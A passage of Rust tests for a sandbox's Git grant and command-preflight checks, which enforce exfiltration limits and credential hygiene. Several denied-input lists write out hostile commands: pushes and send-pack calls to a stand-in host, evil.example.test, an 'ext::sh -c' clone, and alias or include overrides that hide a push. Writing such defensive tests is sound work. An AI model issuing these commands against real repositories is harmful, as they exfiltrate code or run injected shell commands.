            "origin=https://git.example.test/repo.git,upstream",
            "origin=ftp://git.example.test/repo.git",
            "origin=https://*.example.test/repo.git",
            "origin=https://git.example.test:invalid/repo.git",
        ] {
            assert!(GitGrantConfig::from_spec(bad).is_err(), "accepted {bad}");
        }
        assert!(GitGrantConfig::from_spec("  ").unwrap().is_none());
    }

    #[test]
    fn invalid_configuration_never_echoes_supplied_values() {
        const MARKER: &str = "redaction-marker";
        for input in [
            MARKER.to_owned(),
            format!("{MARKER}="),
            format!("origin=https://{MARKER}@git.example.test/repo.git"),
            format!("origin=https://git.example.test/repo.git?label={MARKER}"),
            format!("origin=https://git.example.test/repo.git#{MARKER}"),
            format!("origin={MARKER}"),
            format!("origin={MARKER}://git.example.test/repo.git"),
            format!("origin=file:///workspace/{MARKER}/../repo.git"),
        ] {
            let error = GitGrantConfig::from_spec(&input).unwrap_err();
            assert!(error.contains("SANDBOX_GIT_REMOTES"));
            assert!(
                !error.contains(MARKER),
                "configuration error disclosed input"
            );
        }
    }

    #[test]
    fn network_remotes_require_the_validating_proxy_and_fail_closed_elsewhere() {
        let network_only =
            GitGrantConfig::from_spec("upstream=https://git.example.test/org/repo.git")
                .unwrap()
                .unwrap();
        for mode in [
            SandboxNetworkMode::None,
            SandboxNetworkMode::Tunnel,
            SandboxNetworkMode::Proxy,
        ] {
            let error = authorize_grant(&network_only, &[], Path::new("/tmp"), mode).unwrap_err();
            assert!(error.to_string().contains("git-remotes"), "{error}");
        }
        let grant = authorize_grant(
            &network_only,
            &[],
            Path::new("/tmp"),
            SandboxNetworkMode::ProxyEnforced,
        )
        .unwrap();
        assert_eq!(grant.egress, [SandboxNetworkMode::ProxyEnforced]);
        let (temp, _) = workspace_with_remote();
        let cwd = temp.path().canonicalize().unwrap();
        let file_only = GitGrantConfig::from_spec("origin=file:///workspace/remotes/origin.git")
            .unwrap()
            .unwrap();
        for mode in [
            SandboxNetworkMode::None,
            SandboxNetworkMode::Tunnel,
            SandboxNetworkMode::ProxyEnforced,
        ] {
            let grant = authorize_grant(&file_only, &[], &cwd, mode).unwrap();
            assert!(!grant.egress.contains(&SandboxNetworkMode::Proxy));
        }
        assert!(authorize_grant(&file_only, &[], &cwd, SandboxNetworkMode::Proxy).is_err());
    }

    #[test]
    fn requests_can_narrow_but_never_broaden_the_host_grant() {
        let host = spec();
        let grant = authorize_grant(
            &host,
            &["upstream".to_string()],
            Path::new("/tmp"),
            SandboxNetworkMode::ProxyEnforced,
        )
        .unwrap();
        assert_eq!(grant.remotes.len(), 1);
        assert_eq!(grant.remotes[0].name, "upstream");
        assert_eq!(
            grant
                .proxy_hosts(&["*.example.test".into(), "git.internal".into()])
                .unwrap(),
            ["git.example.test"]
        );
        assert!(matches!(
            grant.proxy_hosts(&["git.internal".into()]),
            Err(SandboxError::CapabilityDenied { .. })
        ));
        let error = authorize_grant(
            &host,
            &["other-tenant".to_string()],
            Path::new("/tmp"),
            SandboxNetworkMode::ProxyEnforced,
        )
        .unwrap_err();
        assert!(matches!(error, SandboxError::CapabilityDenied { .. }));
        assert!(error.to_string().contains("other-tenant"));
    }

    #[test]
    fn file_remotes_must_stay_inside_the_call_workspace() {
        let temp = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        #[cfg(unix)]
        std::os::unix::fs::symlink(outside.path(), temp.path().join("escape")).unwrap();
        let cwd = temp.path().canonicalize().unwrap();
        for name in ["escape", "missing"] {
            let host = GitGrantConfig::from_spec(&format!("origin=file:///workspace/{name}"))
                .unwrap()
                .unwrap();
            let error =
                authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap_err();
            assert!(matches!(error, SandboxError::CapabilityDenied { .. }));
        }
    }

    #[test]
    fn container_env_has_remote_urls_and_hardening_but_no_credentials() {
        let (_temp, grant) = workspace_with_remote();
        let env = grant.container_env();
        let map: std::collections::HashMap<_, _> = env.iter().cloned().collect();
        assert_eq!(
            map.get("GIT_TERMINAL_PROMPT").map(String::as_str),
            Some("0")
        );
        assert_eq!(
            map.get("GIT_CONFIG_GLOBAL").map(String::as_str),
            Some("/dev/null")
        );
        assert_eq!(
            map.get("GIT_CONFIG_KEY_0").map(String::as_str),
            Some("remote.origin.url")
        );
        assert_eq!(
            map.get("GIT_CONFIG_VALUE_0").map(String::as_str),
            Some("file:///workspace/remotes/origin.git")
        );
        assert_eq!(
            map.get("GIT_CONFIG_KEY_1").map(String::as_str),
            Some("credential.helper")
        );
        assert_eq!(map.get("GIT_CONFIG_VALUE_1").map(String::as_str), Some(""));
        let joined = env
            .iter()
            .map(|(key, value)| format!("{key}={value}"))
            .collect::<Vec<_>>()
            .join("\n");
        for needle in ["token", "password", "PRIVATE KEY", "helper="] {
            assert!(
                !joined
                    .to_ascii_lowercase()
                    .contains(&needle.to_ascii_lowercase()),
                "{joined}"
            );
        }
    }

    #[test]
    fn evidence_records_grant_host_and_operations_without_secrets() {
        let (_temp, grant) = workspace_with_remote();
        let evidence = grant.evidence();
        assert_eq!(evidence.grant, GIT_GRANT_ID);
        assert_eq!(evidence.remotes.len(), 1);
        assert_eq!(evidence.remotes[0].name, "origin");
        assert_eq!(evidence.remotes[0].transport, GitTransport::File);
        assert_eq!(
            evidence.remotes[0].operations,
            vec![GitOperationClass::Read]
        );
        let json = serde_json::to_string(&evidence).unwrap();
        assert!(json.contains("\"grant\":\"host:sandbox-git-remotes\""));
        assert!(!json.contains("token"));
        assert!(!json.contains("secret"));
    }

    #[test]
    fn offline_manifest_allows_ordinary_local_reads_without_a_grant() {
        for command in [
            "git clone https://git.example.test/org/repo.git",
            "git push origin main",
            "git -C repo fetch upstream",
            "git ls-remote https://git.example.test/org/repo.git",
            "git remote add origin https://git.example.test/org/repo.git",
            "sh -c 'git pull origin main'",
            "env git fetch origin",
        ] {
            let error =
                authorize_shell_command(command, None, SandboxNetworkMode::None).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
        for command in [
            "git status",
            "git log --oneline -5",
            "git commit -m 'message'",
            "git config --get remote.origin.url",
            "git clone . copy",
            "git clone -q ./repo copy",
            "git fetch",
            "git pull --ff-only",
            "cargo build",
            "echo git clone nope",
        ] {
            authorize_shell_command(command, None, SandboxNetworkMode::None).unwrap();
        }
        for command in ["git clone . copy", "git fetch", "git pull --ff-only"] {
            assert!(matches!(
                authorize_shell_command(command, None, SandboxNetworkMode::ProxyEnforced),
                Err(SandboxError::CapabilityDenied { .. })
            ));
        }
    }

    fn check_granted(command: &str, grant: &GitGrantAuthorization) -> Result<()> {
        authorize_shell_command(command, Some(grant), SandboxNetworkMode::ProxyEnforced)
    }

    #[test]
    fn granted_remote_name_and_exact_url_are_accepted_but_others_are_denied() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            "git clone file:///workspace/remotes/origin.git",
            "git clone /workspace/remotes/origin.git work",
            "git fetch origin",
            "git pull origin main",
            "git ls-remote origin",
            "git remote add backup file:///workspace/remotes/origin.git",
        ] {
            check_granted(command, &grant).unwrap_or_else(|error| {
                panic!("{command}: {error}");
            });
        }
        for command in [
            "git clone https://evil.example.test/repo.git",
            "git clone file:///workspace/remotes/other.git",
            "git fetch upstream",
            "git push https://evil.example.test/repo.git main",
            "git push $REMOTE main",
            "git fetch --all",
            "git fetch",
            "git remote update",
            "git clone ext::sh -c evil",
            "git -c remote.origin.url=https://evil.example.test/r.git push origin main",
            "git --config-env=remote.origin.url=EVIL push origin main",
            "git -c url.https://evil.example.test/.insteadOf=https://git.example.test/ fetch origin",
            "git -c credential.helper=store push origin main",
        ] {
            let error = check_granted(command, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
    }

    #[test]
    fn clone_options_cannot_hide_the_literal_source_from_preflight() {
        let (_temp, grant) = workspace_with_remote();
        for option in ["-c", "--config", "--conf"] {
            let args = tokenize_simple_commands(&format!("{option} user.name=fixture"));
            let error = authorize_clone(
                &args[0],
                Preflight {
                    grant: Some(&grant),
                    offline: false,
                },
            )
            .unwrap_err();
            assert!(error.to_string().contains("unsupported option"), "{error}");
        }
        check_granted(
            "git clone --depth=1 -- /workspace/remotes/origin.git copy",
            &grant,
        )
        .unwrap();
    }

    #[test]
    fn preflight_refuses_push_before_git_can_interpret_flags_or_defaults() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            "git push",
            "git push origin main",
            "git push --repo origin",
            "git push --force origin main",
            "git push -f origin main",
            "git push -qf origin main",
            "git push origin +main",
            "git push --force-with-lease origin main",
            "git push --force-with-lease=main origin main",
            "git push --mirror origin",
            "git push --mirr origin",
            "git push --delete origin old-branch",
            "git push --del origin old-branch",
            "git push origin :old-branch",
            "git push --prune origin",
        ] {
            let error = check_granted(command, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
            assert!(
                error.to_string().contains("git push is not supported"),
                "{error}"
            );
        }
    }

    #[test]
    fn preflight_refuses_remote_transport_plumbing_verbs() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            "git send-pack https://evil.example.test/repo.git HEAD:refs/heads/spliced",
            "git send-pack /workspace/remotes/origin.git HEAD:refs/heads/spliced",
            "git send-pack",
            "git fetch-pack https://evil.example.test/repo.git",
            "git fetch-pack /workspace/remotes/origin.git",
            "git http-push https://evil.example.test/repo.git",
            "git http-fetch origin",
            "git remote-https origin https://evil.example.test/repo.git",
            "git remote-ext origin ext::sh -c evil",
            "true && git send-pack https://evil.example.test/repo.git HEAD:refs/heads/x",
            "sh -c 'git send-pack https://evil.example.test/repo.git HEAD:refs/heads/x'",
        ] {
            let error = check_granted(command, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
            assert!(
                error.to_string().contains("not supported by manifest Git preflight"),
                "{command}: {error}"
            );
        }
        // The plumbing verbs are refused even with no grant and no network.
        for command in ["git send-pack . HEAD:refs/heads/x", "git fetch-pack ."] {
            let error =
                authorize_shell_command(command, None, SandboxNetworkMode::None).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
        // Invoked by path, the plumbing executables are not `git` subcommands.
        for command in [
            "/usr/lib/git-core/git-send-pack /workspace/remotes/origin.git HEAD:refs/heads/x",
            "/usr/lib/git-core/git-fetch-pack https://evil.example.test/repo.git",
            "/usr/lib/git-core/git-remote-https origin https://evil.example.test/repo.git",
            "env /usr/lib/git-core/git-send-pack https://evil.example.test/repo.git HEAD:x",
        ] {
            let error = check_granted(command, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
    }

    #[test]
    fn command_line_config_cannot_redefine_the_scanned_verb() {
        let (_temp, grant) = workspace_with_remote();
        // Honest commands still run; the refusal is scoped to the overrides
        // that change what the scan is looking at.
        for command in [
            "git -c user.name=fixture status",
            "git -c core.pager=cat log -1",
            "git config --get remote.origin.url",
        ] {
            check_granted(command, &grant).unwrap_or_else(|error| panic!("{command}: {error}"));
        }
        for command in [
            "git -c alias.q=push q https://evil.example.test/repo.git HEAD:refs/heads/x",
            "git -calias.q=push q origin HEAD:refs/heads/x",
            "git --config alias.q=push q origin HEAD:refs/heads/x",
            "git --config=alias.q=push q origin HEAD:refs/heads/x",
            "git -c include.path=/tmp/evil.cfg q origin HEAD:refs/heads/x",
            "git -c includeIf.gitdir:/workspace/.path=/tmp/evil.cfg q origin",
            "git -c alias.b=!sh b",
        ] {
            let error = check_granted(command, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
    }

    #[test]
    fn quotes_and_nested_shell_text_are_scanned_conservatively() {
        let (_temp, grant) = workspace_with_remote();
        check_granted(
            "echo 'git clone https://evil.example.test/repo.git'",
            &grant,
        )
        .unwrap();
        for command in [
            "true && git push https://evil.example.test/repo.git main",
            "true; git push https://evil.example.test/repo.git main",
            "true | git clone https://evil.example.test/repo.git",
            "bash -lc \"git clone https://evil.example.test/repo.git\"",
            "bash -c 'git fetch upstream'",
        ] {
            assert!(check_granted(command, &grant).is_err(), "{command}");
        }
        let error = check_granted("bash -c \"$SCRIPT\"", &grant).unwrap_err();
        assert!(error.to_string().contains("dynamic"), "{error}");
    }
}
